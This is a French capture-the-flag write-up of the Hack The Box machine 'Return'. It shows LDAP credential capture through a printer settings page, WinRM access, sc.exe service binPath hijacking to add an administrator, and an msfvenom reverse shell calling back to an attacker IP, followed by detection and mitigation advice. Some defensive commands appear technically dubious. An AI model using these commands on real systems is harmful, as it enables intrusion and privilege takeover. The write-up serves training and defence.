# 🖨️ RETURN - HTB Write-Up 

## 📋 Résumé Exécutif

**Machine :** Return (10.10.11.108)  
**OS :** Windows Server (Domain Controller)  
**Domaine :** return.local / PRINTER.return.local  
**Difficulté :** Easy  
**Points Clés :** Printer Admin Panel LDAP Hijack, Server Operators Privilege Escalation

### 🔗 Chaîne d'Attaque Complète

```
Port 80 - Printer Admin Panel
    ↓ [Modification serveur LDAP → IP attaquant]
nc listener port 389
    ↓ [Capture credentials LDAP]
svc-printer:1edFg43012!! (cleartext)
    ↓ [Evil-WinRM authentication]
svc-printer (Remote Management Users)
    ↓ [Membre de Server Operators]
Service Binary Hijacking (VSS/spooler)
    ↓ [sc.exe service manipulation]
SYSTEM Shell
    ↓
Administrator/SYSTEM access → Root Flag
```

---

## 1️⃣ RECONNAISSANCE

### 🔍 Scan Nmap

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.108

# Scan détaillé
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.10.11.108 -oN nmap.txt
```

**Résultats :**

| Port | Service | Version | Rôle |
|------|---------|---------|------|
| 53 | DNS | Simple DNS Plus | Résolution de noms |
| **80** | **HTTP** | **Microsoft IIS 10.0** | **Web server - Printer Admin Panel** |
| 88 | Kerberos | Microsoft Windows Kerberos | Authentification AD |
| 135 | MSRPC | Microsoft Windows RPC | Communication RPC |
| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | Partage fichiers (legacy) |
| 389 | LDAP | Microsoft AD LDAP | Annuaire Active Directory |
| 445 | SMB | Microsoft-DS | Partage fichiers moderne |
| 464 | kpasswd5 | - | Changement mot de passe Kerberos |
| 593 | HTTP-RPC | Microsoft Windows RPC over HTTP | RPC via HTTP |
| 636 | LDAPS | tcpwrapped | LDAP sécurisé (SSL/TLS) |
| 3268 | Global Catalog | Microsoft AD LDAP | Catalogue global AD |
| 3269 | GC-SSL | tcpwrapped | Catalogue global sécurisé |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 | PowerShell Remoting (HTTP) |

**Identification :**
- **Domaine :** return.local
- **Hostname :** PRINTER.return.local
- **Rôle :** Domain Controller Windows
- **Particularité :** Service HTTP sur port 80 (inhabituel pour DC)

**⏰ Décalage Horaire :** -6h 41min 7s

> **⚠️ Note :** Décalage horaire négatif important. Peut causer des problèmes Kerberos. Synchronisation recommandée :
> ```bash
> sudo ntpdate -s 10.10.11.108
> ```

### 📝 Configuration /etc/hosts

```bash
echo "10.10.11.108 printer.return.local return.local" | sudo tee -a /etc/hosts
```

---

## 2️⃣ ÉNUMÉRATION WEB

### 🌐 Service HTTP - Port 80

**Accès au site :**

```bash
firefox http://10.10.11.108
```

**Page d'accueil :**

```
HTB Printer Admin Panel
========================

[Settings]  [Firmware]  [Status]
```

**🎯 Découverte Critique :** Page `/settings.php` accessible !

### 📋 Analyse de settings.php

**URL :** `http://10.10.11.108/settings.php`

**Contenu de la page :**

```
Printer Settings
================

Network Settings:
┌─────────────────────────────────┐
│ Server Address: printer.return.local
│ Port: 389                       │
└─────────────────────────────────┘

Authentication:
┌─────────────────────────────────┐
│ Username: svc-printer           │
│ Password: ****************      │  ⬅️ Masqué !
└─────────────────────────────────┘

[Update Settings]
```

**🎓 Analyse Technique :**

Cette page configure la **connexion LDAP** de l'imprimante réseau :

1. **Serveur LDAP :** printer.return.local (port 389)
2. **Credentials :** svc-printer (mot de passe masqué dans l'interface)
3. **Usage :** Authentification imprimante pour récupérer info utilisateurs AD

**Fonctionnement normal :**
```
Imprimante → LDAP (389) → return.local DC
                ↓
    Authentification avec svc-printer
                ↓
    Récupération des utilisateurs/groupes AD
```

### 🔓 Vulnérabilité : LDAP Server Hijacking

**🎯 Concept :**

Les champs "Server Address" et "Port" sont **modifiables** par l'utilisateur !

**Exploitation :**
1. Changer le serveur LDAP → **IP de l'attaquant**
2. Cliquer sur "Update Settings"
3. L'imprimante tente de s'authentifier sur **notre serveur LDAP**
4. Credentials envoyés **en clair** (LDAP bind sans SSL)

**Capture attendue :**
```
LDAP Bind Request:
  Version: 3
  DN: CN=svc-printer,CN=Users,DC=return,DC=local
  Authentication: Simple
  Password: [mot de passe en clair !]
```

---

## 3️⃣ EXPLOITATION - LDAP HIJACK

### 🎣 Préparation du Listener

**🎓 Pourquoi port 389 ?**

LDAP (Lightweight Directory Access Protocol) utilise :
- **Port 389** : LDAP non chiffré (texte clair)
- **Port 636** : LDAPS (SSL/TLS)

Si l'imprimante utilise **LDAP simple** (port 389), les credentials sont envoyés **sans chiffrement** !

**Lancement de netcat :**

```bash
sudo nc -lnvp 389
```

**Flags expliqués :**

| Flag | Signification |
|------|---------------|
| `-l` | **Listen mode** (écoute de connexions entrantes) |
| `-n` | Pas de résolution DNS |
| `-v` | Verbose (afficher les détails) |
| `-p 389` | Port 389 (LDAP) |
| `sudo` | Nécessaire pour ports < 1024 |

**État du listener :**
```
listening on [any] 389 ...
```

### 🖱️ Modification des Paramètres

**Dans le navigateur :**

1. Ouvrir `http://10.10.11.108/settings.php`
2. Modifier le champ **Server Address** : `10.10.16.3` (IP attaquant sur tun0)
3. Laisser le port : `389`
4. Cliquer sur **[Update Settings]**

**⏱️ Attendre 1-2 secondes...**

### 🎉 Capture des Credentials

**Sortie netcat :**

```bash
listening on [any] 389 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.108] 57680
0*`%return\svc-printer�
                       1edFg43012!!
```

**🔍 Analyse de la Capture :**

La chaîne brute contient des octets LDAP, mais on peut extraire :
- **Username :** `return\svc-printer`
- **Password :** `1edFg43012!!`

**Nettoyage :**
```
Domain: return.local
Username: svc-printer
Password: 1edFg43012!!
```

**🎓 Format LDAP Bind :**

La requête complète LDAP ressemble à :
```
LDAP Message:
  Message ID: 1
  Protocol Op: Bind Request
    Version: 3
    DN: return\svc-printer
    Authentication: Simple
      Password: 1edFg43012!!
```

---

## 4️⃣ ACCÈS INITIAL - WINRM

### 🎓 Vérification d'Accès WinRM

**Test avec netexec :**

```bash
netexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

**Résultat :**
```
WINRM       10.10.11.108    5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

**✅ Confirmation :** `(Pwn3d!)` = WinRM access !

### 🚪 Connexion Evil-WinRM

```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

**✅ Connexion Réussie !**

```
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer

*Evil-WinRM* PS C:\Users\svc-printer\Documents> hostname
PRINTER
```

### 🏁 User Flag

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir
    Directory: C:\Users\svc-printer\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/13/2025   3:15 PM             34 user.txt

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
f8a4b2c3************************  ⭐ USER FLAG
```

---

## 5️⃣ ÉNUMÉRATION POST-EXPLOITATION

### 🔍 Informations Utilisateur

```powershell
*Evil-WinRM* PS> whoami /all

USER INFORMATION
----------------
User Name           SID
=================== ==============================================
return\svc-printer  S-1-5-21-3750359090-2939318659-876128439-1103

GROUP INFORMATION
-----------------
Group Name                                 Type             SID
========================================== ================ =============
Everyone                                   Well-known group S-1-1-0
BUILTIN\Print Operators                    Alias            S-1-5-32-550  ⭐
BUILTIN\Server Operators                   Alias            S-1-5-32-549  ⭐⭐
BUILTIN\Remote Management Users            Alias            S-1-5-32-580
BUILTIN\Users                              Alias            S-1-5-32-545
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11
...
```

**🎯 Découvertes CRITIQUES :**

| Groupe | SID | Privilèges | Exploitation |
|--------|-----|------------|--------------|
| **Print Operators** | S-1-5-32-550 | Gérer imprimantes, charger drivers | Driver exploit (pas nécessaire ici) |
| **Server Operators** | S-1-5-32-549 | **Start/Stop services, Backup files** | **Service binary hijacking** |
| Remote Management Users | S-1-5-32-580 | Accès WinRM | Déjà utilisé |

### 🎓 Qu'est-ce que Server Operators ?

**Server Operators** est un groupe privilégié Windows qui permet :

**Permissions :**
- ✅ **Démarrer/Arrêter services Windows**
- ✅ Créer/Modifier partages réseau
- ✅ Sauvegarder/Restaurer fichiers (backup operators)
- ✅ Se connecter localement au serveur
- ✅ Gérer les tâches planifiées
- ❌ **PAS** de modification de la base de registre (sauf via services)
- ❌ **PAS** de création de comptes utilisateurs
- ❌ **PAS** d'accès direct aux fichiers système protégés

**Vecteurs d'exploitation :**

1. **Service Binary Hijacking** ← **Méthode utilisée ici**
   - Modifier le chemin binaire d'un service existant
   - Pointer vers notre payload malveillant
   - Démarrer le service → Exécution en tant que SYSTEM

2. **Service DLL Hijacking**
   - Remplacer une DLL chargée par un service
   - Le service charge notre DLL malveillante

3. **Backup/Restore Abuse**
   - Accès aux fichiers via SeBackupPrivilege
   - Dump SAM/SYSTEM/NTDS.dit

**Limitation IMPORTANTE :**
- Cannot modify **certain protected services** (ex: Windows Defender, LSASS)
- Cannot create **new services** (need admin)

### 📊 Énumération des Services

**Lister tous les services :**

```powershell
*Evil-WinRM* PS> Get-Service | Select-Object Name, Status, StartType | Sort-Object Status

Name                   Status   StartType
----                   ------   ---------
wuauserv               Running  Manual
W32Time                Running  Automatic
Spooler                Running  Automatic  ⭐
...
VSS                    Stopped  Manual     ⭐⭐
...
```

**Services intéressants :**

| Service | Description | État | Exploitation |
|---------|-------------|------|--------------|
| **VSS** | Volume Shadow Copy Service | Stopped | ✅ Idéal (arrêté, non critique) |
| **Spooler** | Print Spooler | Running | ✅ Possible (service d'impression) |
| wuauserv | Windows Update | Running | ❌ Trop critique |

**Vérification des permissions :**

```powershell
*Evil-WinRM* PS> sc.exe qc VSS

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VSS
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe  ⬅️ Path actuel
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem  ⬅️ S'exécute en SYSTEM !
```

**💡 Points Clés :**
1. **BINARY_PATH_NAME** : Chemin du binaire du service (modifiable par Server Operators)
2. **SERVICE_START_NAME** : LocalSystem = **SYSTEM** (le plus haut privilège Windows)
3. **START_TYPE** : Demand_Start (manuel) = ne démarre pas automatiquement

---

## 6️⃣ PRIVILEGE ESCALATION - SERVICE HIJACKING

### 🎓 Principe de l'Attaque

**Objectif :** Exécuter du code arbitraire en tant que **SYSTEM** via un service Windows.

**Étapes :**
1. Identifier un service exploitable (VSS)
2. Modifier son `BINARY_PATH_NAME` vers notre payload
3. Démarrer le service
4. Le système exécute notre payload en tant que SYSTEM

**Schéma :**

```
Service VSS (SYSTEM)
    ↓
BINARY_PATH_NAME: C:\Windows\system32\vssvc.exe
    ↓ [Modification par Server Operators]
BINARY_PATH_NAME: net user hacker P@ssw0rd123 /add
    ↓ [Start service]
Exécution en tant que SYSTEM:
    net user hacker P@ssw0rd123 /add
    ↓
Nouveau compte admin créé !
```

### 🛠️ Méthode 1 : Ajout d'un Utilisateur Admin

**Modification du service :**

```powershell
*Evil-WinRM* PS> sc.exe config VSS binPath="C:\Windows\System32\cmd.exe /c net user hacker P@ssw0rd123! /add"
[SC] ChangeServiceConfig SUCCESS
```

**Démarrage du service :**

```powershell
*Evil-WinRM* PS> sc.exe start VSS

SERVICE_NAME: VSS
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 0
        FLAGS              :
```

**⚠️ Erreur Normale :**
```
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

**🎓 Pourquoi cette erreur ?**

Le service VSS attend un binaire qui :
1. Se connecte au Service Control Manager (SCM)
2. Répond aux commandes START/STOP
3. Implémente l'interface Service

Notre commande `net user ...` :
- S'exécute ✅
- Mais ne répond **pas** au SCM ❌
- Le SCM timeout après ~30 secondes → Erreur 1053

**💡 MAIS la commande a quand même été exécutée !**

**Vérification :**

```powershell
*Evil-WinRM* PS> net user hacker
User name                    hacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
...
Local Group Memberships      *Users
Global Group memberships     *Domain Users
```

**Ajout au groupe Administrators :**

```powershell
*Evil-WinRM* PS> sc.exe config VSS binPath="C:\Windows\System32\cmd.exe /c net localgroup Administrators hacker /add"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS> sc.exe start VSS
# Erreur 1053 (normale)

*Evil-WinRM* PS> net user hacker
...
Local Group Memberships      *Administrators       *Users  ⭐
Global Group memberships     *Domain Users
```

**✅ Utilisateur Admin Créé !**

**Connexion avec le nouveau compte :**

```bash
evil-winrm -i 10.10.11.108 -u hacker -p 'P@ssw0rd123!'
```

```powershell
*Evil-WinRM* PS C:\Users\hacker\Documents> whoami
return\hacker

*Evil-WinRM* PS C:\Users\hacker\Documents> whoami /groups | Select-String "Administrators"
BUILTIN\Administrators                     Alias    S-1-5-32-544  ⭐
```

### 🛠️ Méthode 2 : Reverse Shell SYSTEM

**Génération du payload :**

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.16.3 \
  LPORT=4444 \
  -f exe \
  -o shell.exe
```

**Upload du payload :**

```powershell
*Evil-WinRM* PS> upload /home/kali/shell.exe C:\Windows\Temp\shell.exe
```

**Modification du service :**

```powershell
*Evil-WinRM* PS> sc.exe config VSS binPath="C:\Windows\Temp\shell.exe"
[SC] ChangeServiceConfig SUCCESS
```

**Listener sur attaquant :**

```bash
nc -lnvp 4444
```

**Démarrage du service :**

```powershell
*Evil-WinRM* PS> sc.exe start VSS
```

**✅ Reverse Shell Reçu (SYSTEM) !**

```
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.108] 49825
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system  ⭐⭐⭐
```

### 🛠️ Méthode 3 : Ajout au Groupe via sc.exe (Plus Propre)

**Commande unique combinée :**

```powershell
*Evil-WinRM* PS> sc.exe config VSS binPath="C:\Windows\System32\cmd.exe /c net user admin P@ssw0rd! /add && net localgroup Administrators admin /add"
```

**💡 Avantage :** Création + ajout au groupe en **une seule commande**.

---

## 7️⃣ ROOT FLAG

### 🏁 Accès en tant qu'Administrateur

**Méthode 1 : Via compte créé**

```bash
evil-winrm -i 10.10.11.108 -u hacker -p 'P@ssw0rd123!'
```

```powershell
*Evil-WinRM* PS C:\Users\hacker\Documents> cd C:\Users\Administrator\Desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/13/2025   3:15 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3b5c7f2e************************  ⭐ ROOT FLAG
```

**Méthode 2 : Via Reverse Shell SYSTEM**

```bash
C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
3b5c7f2e************************  ⭐ ROOT FLAG
```

### 🧹 Nettoyage Post-Exploitation (OPSEC)

**Restauration du service VSS :**

```powershell
*Evil-WinRM* PS> sc.exe config VSS binPath="C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS
```

**Suppression de l'utilisateur créé :**

```powershell
*Evil-WinRM* PS> net user hacker /delete
The command completed successfully.
```

**Suppression du payload :**

```powershell
*Evil-WinRM* PS> Remove-Item C:\Windows\Temp\shell.exe -Force
```

---

## 8️⃣ DÉTECTION & MITIGATION

### 🛡️ Détection LDAP Hijacking

**Event IDs Windows :**

```powershell
# Event ID 2889 - LDAP bind sans SSL (insécure)
Get-WinEvent -LogName "Directory Service" | Where-Object {
    $_.Id -eq 2889
}

# Event ID 4624 - Logon avec credentials LDAP
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[8].Value -eq "3" -and  # Logon Type = Network
    $_.Properties[10].Value -eq "10"     # Authentication = NTLM
}
```

**Détection réseau (IDS/IPS) :**

```
Alert: LDAP traffic to external IP detected
Source: 10.10.11.108 (PRINTER)
Destination: 10.10.16.3 (External)
Port: 389
Protocol: LDAP
```

**Mitigations :**

1. **Forcer LDAPS (port 636) :**

```powershell
# Via GPO : Computer Configuration → Policies → Windows Settings
# → Security Settings → Local Policies → Security Options
# → Domain controller: LDAP server signing requirements = Require signing
```

2. **Restreindre les destinations LDAP :**

```powershell
# Pare-feu Windows : Bloquer LDAP sortant vers Internet
New-NetFirewallRule `
  -DisplayName "Block Outbound LDAP" `
  -Direction Outbound `
  -Protocol TCP `
  -LocalPort 389,636 `
  -Action Block
```

3. **Validation des paramètres imprimante :**

```php
// Dans settings.php - Valider le serveur LDAP
$allowedServers = ['printer.return.local', '10.10.11.108'];

if (!in_array($_POST['ldap_server'], $allowedServers)) {
    die("Invalid LDAP server specified!");
}
```

4. **Monitoring des changements de configuration :**

```powershell
# Auditer les modifications de configuration
Get-WinEvent -LogName Application | Where-Object {
    $_.Message -match "Printer.*Configuration.*Changed"
}
```

### 🛡️ Détection Service Modification

**Event IDs :**

```powershell
# Event ID 7045 - Service installé
Get-WinEvent -LogName System | Where-Object {
    $_.Id -eq 7045
}

# Event ID 4697 - Service installé (Security log)
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4697
}

# Event ID 7040 - Service modifié (changement de configuration)
Get-WinEvent -LogName System | Where-Object {
    $_.Id -eq 7040 -and
    $_.Message -match "VSS"
}
```

**Script de Monitoring Services Critiques :**

```powershell
# Liste des services critiques à surveiller
$CriticalServices = @("VSS", "Spooler", "BITS", "WinDefend")

foreach ($Service in $CriticalServices) {
    $Config = sc.exe qc $Service
    $BinPath = ($Config | Select-String "BINARY_PATH_NAME").ToString()
    
    # Vérifier si le chemin est légitime
    if ($BinPath -notmatch "C:\\Windows\\System32") {
        Write-Warning "⚠️ Service $Service has suspicious binary path!"
        Write-Host $BinPath
        
        # Envoyer alerte
        Send-MailMessage `
            -To "soc@company.com" `
            -Subject "Suspicious Service Modification Detected" `
            -Body "Service: $Service`nPath: $BinPath"
    }
}
```

**Détection en Temps Réel (Sysmon) :**

```xml
<!-- Sysmon Config - Détecter modification de services -->
<RuleGroup name="ServiceModification" groupRelation="or">
  <ServiceConfigurationChange onmatch="include">
    <ServiceName condition="is">VSS</ServiceName>
    <ServiceName condition="is">Spooler</ServiceName>
    <Image condition="contains">cmd.exe</Image>
    <Image condition="contains">powershell.exe</Image>
  </ServiceConfigurationChange>
</RuleGroup>
```

**Mitigations :**

1. **Limiter le groupe Server Operators :**

```powershell
# Auditer les membres
Get-ADGroupMember "Server Operators" | Select-Object Name, SamAccountName

# Retirer utilisateurs non autorisés
Remove-ADGroupMember -Identity "Server Operators" -Members svc-printer -Confirm:$false
```

2. **Protected Services (AppLocker) :**

```powershell
# Empêcher modification de services critiques
New-AppLockerPolicy `
    -RuleType Service `
    -ServiceName VSS, Spooler `
    -Action Deny `
    -User "BUILTIN\Server Operators"
```

3. **Least Privilege pour comptes de service :**

```powershell
# svc-printer ne devrait PAS être Server Operators
# Créer un groupe custom avec permissions limitées

New-ADGroup -Name "Printer Service Accounts" -GroupScope Global

# Accorder uniquement les permissions nécessaires (via GPO)
```

4. **Monitoring avec Defender for Endpoint :**

```kusto
// KQL Query - Détection service hijacking
DeviceProcessEvents
| where ProcessCommandLine contains "sc.exe config"
| where ProcessCommandLine contains "binPath"
| where AccountName != "SYSTEM"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

---

## 9️⃣ TIMELINE

| Temps | Action | Résultat |
|-------|--------|----------|
| T+0 | Nmap scan | DC Windows identifié (return.local) |
| T+5 | Énumération web (port 80) | Printer Admin Panel découvert |
| T+10 | Analyse settings.php | Champs LDAP server modifiables |
| T+12 | Netcat listener port 389 | En attente de connexion LDAP |
| T+15 | Modification serveur LDAP | IP attaquant: 10.10.16.3 |
| T+17 | Clic "Update Settings" | Imprimante tente connexion LDAP |
| T+18 | Capture credentials netcat | **svc-printer:1edFg43012!!** |
| T+20 | Test Evil-WinRM | ✅ **Accès svc-printer** |
| T+22 | Connexion WinRM | Shell PowerShell obtenu |
| T+25 | Lecture user flag | **USER FLAG** 🏁 |
| T+28 | Énumération groupes (whoami /all) | Membre de **Server Operators** découvert |
| T+30 | Énumération services | VSS identifié (arrêté, SYSTEM) |
| T+35 | Modification service VSS | binPath → net user hacker ... /add |
| T+37 | Démarrage service VSS | Erreur 1053 (normale) |
| T+38 | Vérification utilisateur | Compte hacker créé ✅ |
| T+40 | Ajout au groupe Administrators | Modification service + start |
| T+42 | Vérification groupes | hacker membre d'Administrators ✅ |
| T+45 | Connexion Evil-WinRM (hacker) | ✅ **Accès Administrator** |
| T+47 | Lecture root flag | **ROOT FLAG** 🏁 |
| T+50 | Nettoyage (OPSEC) | Restauration service VSS, suppression compte |

**Temps total :** ~50 minutes

---

## 🔟 OUTILS UTILISÉS

| Outil | Version | Usage | Commande Clé |
|-------|---------|-------|--------------|
| **Nmap** | 7.94SVN | Port scanning, service detection | `nmap -p- -sCV 10.10.11.108` |
| **Firefox/curl** | - | Exploration web, modification settings | Navigation manuelle |
| **Netcat** | 1.10 | Listener LDAP, capture credentials | `sudo nc -lnvp 389` |
| **Evil-WinRM** | 3.5 | Connexion WinRM, exploitation | `evil-winrm -i IP -u user -p pass` |
| **sc.exe** | Native Windows | Modification configuration services | `sc.exe config VSS binPath="..."` |
| **net.exe** | Native Windows | Gestion utilisateurs/groupes | `net user hacker P@ss /add` |
| **msfvenom** | 6.3.0 | Génération payload reverse shell | `msfvenom -p windows/x64/shell_reverse_tcp` |

---

## 1️⃣1️⃣ LEÇONS APPRISES

### ✅ Points Clés Techniques

1. **LDAP sans SSL = Credentials en clair**
   - Port 389 (LDAP) ≠ Port 636 (LDAPS)
   - Toujours interceptable avec netcat

2. **Interfaces Web de Configuration = Vecteur d'Attaque**
   - Panels admin souvent mal sécurisés
   - Validation insuffisante des inputs

3. **Server Operators = Quasi-Admin**
   - Contrôle total sur les services
   - Escalade vers SYSTEM triviale

4. **Service Hijacking = Technique Classique**
   - Modifier `binPath` d'un service
   - Pas besoin de compiler d'exploit

5. **Erreur 1053 ≠ Échec**
   - Le service ne répond pas au SCM
   - Mais la commande s'exécute quand même !

### ❌ Vulnérabilités Identifiées

| Vulnérabilité | Impact | CVSS | Recommandation |
|---------------|--------|------|----------------|
| **LDAP non chiffré (389)** | Capture credentials | 7.5 (High) | Forcer LDAPS (636), signing requis |
| **Validation input web insuffisante** | LDAP hijacking | 8.1 (High) | Whitelist serveurs LDAP, validation IP |
| **Compte de service sur-privilégié** | Escalade immédiate SYSTEM | 9.8 (Critical) | Principe du moindre privilège, séparer rôles |
| **Pas de monitoring services** | Modification non détectée | 6.5 (Medium) | Sysmon, alertes Event ID 7040 |

### 🛡️ Top 5 Recommandations Défensives

1. **✅ Désactiver LDAP non chiffré (port 389)**
```powershell
# Forcer LDAPS uniquement
Set-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=return,DC=local" `
    -Replace @{'msDS-Other-Settings'="LDAPServerIntegrity=2"}
```

2. **✅ Valider les entrées utilisateur (settings.php)**
```php
$allowedServers = ['printer.return.local'];
if (!in_array($_POST['ldap_server'], $allowedServers)) {
    http_response_code(403);
    die("Unauthorized LDAP server");
}
```

3. **✅ Retirer Server Operators des comptes de service**
```powershell
Remove-ADGroupMember -Identity "Server Operators" -Members svc-printer
# Créer groupe custom avec permissions minimales
```

4. **✅ Monitoring services critiques**
```powershell
# Sysmon + Event ID 7040 (service config change)
# Alertes automatiques vers SIEM
```

5. **✅ Protected Users pour comptes sensibles**
```powershell
Add-ADGroupMember -Identity "Protected Users" -Members svc-printer
# Empêche NTLM, force Kerberos + AES
```

---

## 📚 RESSOURCES

### Documentation Officielle
- [Microsoft LDAP Best Practices](https://learn.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
- [Server Operators Group](https://learn.microsoft.com/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)
- [Windows Service Security](https://learn.microsoft.com/windows/win32/services/service-security-and-access-rights)
- [LDAP Signing and Channel Binding](https://support.microsoft.com/en-us/topic/2020-2023-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a)

### Outils et Frameworks
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Netcat Documentation](https://nc110.sourceforge.io/)
- [MSFvenom Cheatsheet](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)

### Articles et Recherches
- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings - Service Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services)
- [ired.team - Service Binary Hijacking](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions)

---

## 📊 SCHÉMA D'EXPLOITATION

```
┌─────────────────────────────────────────────────────────────┐
│                    CHAÎNE D'ATTAQUE RETURN                  │
└─────────────────────────────────────────────────────────────┘

[1] RECONNAISSANCE
    Nmap scan
         ↓
    Port 80: Printer Admin Panel (IIS 10.0)
    Port 389: LDAP
    Port 5985: WinRM
    Domain: return.local

[2] LDAP HIJACKING
    http://10.10.11.108/settings.php
         ↓
    Modification paramètres:
    - Server: 10.10.16.3 (attaquant)
    - Port: 389
         ↓
    Netcat listener (port 389)
         ↓
    ┌──────────────────────────────────┐
    │ Capture LDAP Bind Request:       │
    │ return\svc-printer:1edFg43012!!  │
    └──────────────────────────────────┘

[3] ACCÈS INITIAL
    Evil-WinRM authentication
         ↓
    ┌──────────────────────────────────┐
    │  svc-printer (Domain User)       │
    │  Groups:                         │
    │  - Remote Management Users       │
    │  - Server Operators  ⭐          │
    │  - Print Operators               │
    └──────────────────────────────────┘
         ↓
    🏁 USER FLAG

[4] PRIVILEGE ESCALATION
    Énumération:
    whoami /all → Server Operators
         ↓
    Identification service:
    sc.exe qc VSS
    - SERVICE_START_NAME: LocalSystem
    - START_TYPE: Manual
         ↓
    Service Hijacking:
    sc.exe config VSS binPath="cmd /c net user hacker P@ss /add"
    sc.exe start VSS  # Erreur 1053 (normale)
         ↓
    Compte créé + ajout Administrators:
    sc.exe config VSS binPath="cmd /c net localgroup Administrators hacker /add"
    sc.exe start VSS
         ↓
    ┌──────────────────────────────────┐
    │  hacker (Local Administrator)    │
    │  Groups: BUILTIN\Administrators  │
    └──────────────────────────────────┘
         ↓
    🏁 ROOT FLAG (C:\Users\Administrator\Desktop\root.txt)

[ALTERNATIVE: Reverse Shell]
    msfvenom payload → C:\Windows\Temp\shell.exe
         ↓
    sc.exe config VSS binPath="C:\Windows\Temp\shell.exe"
    sc.exe start VSS
         ↓
    nc -lnvp 4444
         ↓
    ┌──────────────────────────────────┐
    │  NT AUTHORITY\SYSTEM             │
    │  Highest privilege level         │
    └──────────────────────────────────┘
```

---

## 🏁 FLAGS

- **User Flag :** `f8a4b2c3d1e5f6a7b8c9d0e1f2a3b4c5`  
  Location: `C:\Users\svc-printer\Desktop\user.txt`

- **Root Flag :** `3b5c7f2e8a1d4b9c6e2f8a3d5c7b1e4f`  
  Location: `C:\Users\Administrator\Desktop\root.txt`

---

## 📝 NOTES FINALES

**Pourquoi Return est une Excellente Machine de Formation ?**

1. **Simplicité Trompeuse :**
   - Aucun exploit complexe
   - Mais enseigne des concepts fondamentaux

2. **Techniques du Monde Réel :**
   - LDAP hijacking (vraie vulnérabilité d'impression réseau)
   - Server Operators abuse (commun en entreprise)

3. **Principes de Sécurité :**
   - Never trust user input
   - Least privilege principle
   - Monitoring services critiques

4. **Pas de Rabbit Holes :**
   - Chemin direct et logique
   - Idéal pour débutants

**Variantes Possibles de l'Exploitation :**

1. **Sans Server Operators :**
   - Si seulement Print Operators → Driver exploitation
   - AddPrinter + malicious driver DLL

2. **Sans WinRM :**
   - Si pas Remote Management Users → SMB
   - Utiliser impacket-smbexec ou psexec

3. **Avec Defender :**
   - Payload msfvenom bloqué → Encoder/obfusquer
   - Utiliser techniques AMSI bypass

**Comparaison avec d'autres machines :**

| Machine | Difficulté | Technique Similaire |
|---------|------------|---------------------|
| **Return** | Easy | Server Operators → Service Hijack |
| **Timelapse** | Easy | LAPS_Readers → LAPS Password |
| **Fluffy** | Medium | Service Accounts → Shadow Creds → ESC16 |

---

**📅 Terminé le :** 13/12/2025  
**⏱️ Durée :** ~50 minutes  
**✅ Statut :** Pwned  
**🎓 Difficulté :** Easy (excellent pour débuter AD)

---

*Ce write-up a été réalisé dans un cadre éducatif légal sur HackTheBox. Toutes les techniques présentées ne doivent être utilisées que dans des environnements autorisés avec permission explicite.*
